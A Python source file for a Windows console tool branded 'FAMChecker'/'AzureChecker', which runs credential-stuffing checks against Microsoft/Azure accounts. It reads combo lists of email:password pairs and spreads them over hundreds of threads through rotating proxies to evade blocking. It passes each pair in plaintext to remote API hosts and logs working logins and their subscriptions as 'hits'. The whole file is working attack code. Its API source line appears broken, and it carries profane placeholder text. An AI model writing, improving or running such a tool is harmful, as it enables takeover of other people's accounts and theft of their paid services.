from ctypes import windll
from multiprocessing.dummy import Pool
from time import strftime, sleep
from yaml import safe_load
import os
import re
from colorama import Fore, init
from tkinter import filedialog
import tkinter
from random import choice
from threading import Thread
import requests
import sys

def preparations():
    global Checker
    global config
    default_config = '''# 响应时间
timeout: 10
# 线程
threads: 300
# 保存无效的卡
save_bad: true
# 输出无效的卡
print_bad: true
# 智能跳过无用alt
AutoBypass: true
# 使用代理
proxy: true
# 代理类型 HTTPS|SOCKS4/5
proxy_type: 'HTTPS'
# 代理api
proxy_api: false
# 代理api地址
proxy_api_url: 'https://www.我日你先人.com'
# 刷新时间(秒/s)
re_fresh: 100
'''
    while True:
        try:
            config = safe_load(open('config/config.yml', 'r', errors='ignore'))
            break
        except:
            if not os.path.exists('config'):
                os.mkdir('config')
            open('config/config.yml', 'w').write(default_config)
            sleep(2)

    class Checker:
        timeout = int(config['timeout'])
        threads = int(config['threads'])
        savebad = bool(config['save_bad'])
        print_bad = bool(config['print_bad'])
        autobypass = bool(config['AutoBypass'])
        proxy = bool(config['proxy'])
        proxy_type = str(config['proxy_type'])
        proxyapi = bool(config['proxy_api'])
        Url = str(config['proxy_api_url'])
        refresh = int(config['re_fresh'])

class MicroRes:
    hits = 0
    bad = 0
    none = 0
    sub = 0
    nt = 0
    err = 0

class MicrosoftMailChecker:

    def __init__(self):
        self.t = f'''{Fore.LIGHTBLUE_EX}  
               __________          _______              ___     ___          
              /  _______/         /  ___  \            /    \  /   \    
             /  /_______         /  /___\  \          /      \/     \   
            /  ________/        /  _______  \        /  / \     / \  \   
           /  /                /  /       \  \      /  /   \___/   \  \   
          /__/                /__/         \__\    /__/             \__\        
        \n{Fore.RESET}'''
        print(self.t)
        self.apiList = ["你要你妈Api呢"]
        self.apiList.extend(requests.get("api").text.split("\n"))
        print(F"{Fore.MAGENTA}Api:Loaded {len(self.apiList)} lines")
        self.proxy_type = Checker.proxy_type.lower()
        while True:
            try:
                file = filedialog.askopenfilename(initialdir=(os.getcwd()), title='Select A Combo',
                                                  filetypes=(('txt files', '*.txt'),
                                                             ('all files', '*.*')))
                self.combolist = open(file, 'r', encoding='utf-8', errors='ignore').read().split('\n')
                break
            except:
                print(f"{Fore.LIGHTRED_EX}你没有选择Combo")
                continue
        if Checker.proxy:
            if not Checker.proxyapi:
                while True:
                    try:
                        filename = filedialog.askopenfilename(initialdir=(os.getcwd()), title='Select A ProxyList',
                                                              filetypes=(('txt files', '*.txt'),
                                                                         ('all files', '*.*')))
                        self.proxylist = open(filename, 'r', encoding='u8', errors='ignore').read().split('\n')
                        break
                    except:
                        print(f"{Fore.LIGHTRED_EX}你没有选择Proxoes!")
                        continue
            else:
                try:
                    self.proxylist = requests.get(url=Checker.Url).text.split('\n')
                except:
                    print('获取代理失败!')
                    sleep(5)
                    sys.exit()
        else:
            self.proxylist = []
        print(f"{Fore.LIGHTBLUE_EX}Combo:Loaded {len(self.combolist)} lines")
        if Checker.proxy:
            print(f"{Fore.LIGHTWHITE_EX}Proxies:Loaded {len(self.proxylist)} lines")
        sleep(3)
        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
        self.savepath = f'Hits/{unix}'
        if not os.path.exists('Hits'):
            os.mkdir('Hits')
        if not os.path.exists(self.savepath):
            os.mkdir(self.savepath)
        os.system('cls')
        Thread(target=self.title, daemon=True).start()
        if Checker.proxyapi and Checker.proxy:
            Thread(target=self.refresh, daemon=True).start()
        pool = Pool(Checker.threads)
        res = pool.imap_unordered(func=self.CheckMail, iterable=self.combolist)
        for r in res:
            if r[0]:
                MicroRes.hits += 1
                print(f'{Fore.LIGHTGREEN_EX}[+] {r[0]} | {r[1]}')
                try:
                    with open(f'{self.savepath}/Hits.txt', 'a+') as f:
                        f.write(f'{r[0]}\n')
                except:
                    print(f'{Fore.LIGHTCYAN_EX}Failed To Save Hit:{r[1]}')
            else:
                MicroRes.bad += 1
                if Checker.print_bad:
                    print(f'{Fore.LIGHTRED_EX}[-] {r[1]}')
                if Checker.savebad:
                    try:
                        with open(f'{self.savepath}/Fail.txt', 'a+') as f:
                            f.write(f'{r[1]}\n')
                    except:
                        print(f'{Fore.LIGHTMAGENTA_EX}Failed To Save Fail:{r[1]}')
        pool.close()
        print(f'{Fore.MAGENTA}Finished! Thanks For You Using FAMChecker!')
        input()
        sys.exit()

    def CheckMail(self, line):
        while True:
            try:
                email, password = line.split(':')
                url = choice(self.apiList)
                if Checker.proxy:
                    res = requests.get(f"{url}api/subscriptions?email={email}&password={password}", proxies=self.proxies(), timeout=Checker.timeout).text
                else:
                    res = requests.get(f"{url}api/subscriptions?email={email}&password={password}", timeout=Checker.timeout).text
                if res == "[]":
                    with open(f"{self.savepath}/Not Active.txt", "a+") as f:
                        f.write(f"{line} Not Active\n")
                    MicroRes.nt += 1
                    return [line, "Not Active"]
                elif "heroku" in res:
                    MicroRes.err += 1
                    with open(f"{self.savepath}/err.txt", "a+") as f:
                        f.write(f"{res}\n")
                    continue
                elif "Get toekn" in res:
                    continue
                elif "WS-Trust RST request returned http error: 403 and server response" in res:
                    continue
                elif "Unsupported wstrust endpoint version" in res:
                    continue
                else:
                    if "error" in res:
                        return [False, line]
                    if res == '{}':
                        MicroRes.none += 1
                        with open(f"{self.savepath}/None.txt", "a+") as f:
                            f.write(f"{line} Sub:None\n")
                        return [line, "Sub: None"]
                    subList = re.findall(r'name":"(.+?)"', res)
                    stateList = re.findall(r'state":"(.+?)"', res)
                    for i in subList:
                        if "@" in i:
                            subList.remove(i)
                    infoList = []
                    if not len(subList) == 0:
                        for sub in subList:
                            for state in stateList:
                                infoList.append(f"{sub}:{state}")
                        MicroRes.sub += 1
                        with open(f"{self.savepath}/Sub.txt", "a+") as f:
                            f.write(f"{line} | SubList - {infoList}'\n")
                        return [line, f'| SubList - {infoList}']
                    else:
                        return [False, line]
            except ValueError:
                return [False, line]
            except:
                continue

    def proxies(self):
        proxy = choice(self.proxylist)
        proxy = proxy.strip()
        if proxy.count(':') == 3:
            spl = proxy.split(':')
            proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
        else:
            proxy = proxy
        if self.proxy_type == 'http' or self.proxy_type == 'https':
            proxy_form = {
                'http': f"http://{proxy}",
                'https': f"https://{proxy}"
            }
        else:
            proxy_form = {
                'http': f"{self.proxy_type}://{proxy}",
                'https': f"{self.proxy_type}://{proxy}"
            }
        return proxy_form

    def refresh(self):
        while True:
            sleep(Checker.refresh)
            try:
                self.proxylist = requests.get(url=Checker.Url, timeout=Checker.timeout).text.split('\n')
            except:
                print('更换失败!,重试中...')
                continue

    def title(self):
        while True:
            windll.kernel32.SetConsoleTitleW(
                'AzureChecker|'
                f'Good:{MicroRes.hits}|'
                f'Fail:{MicroRes.bad}|'
                f"Subscrpition:{MicroRes.sub}|"
                f"None:{MicroRes.none}|"
                f"Not Active:{MicroRes.nt}|"
                f"ApiError:{MicroRes.err}|"
                f'Checked {MicroRes.hits + MicroRes.bad} of {len(self.combolist)}')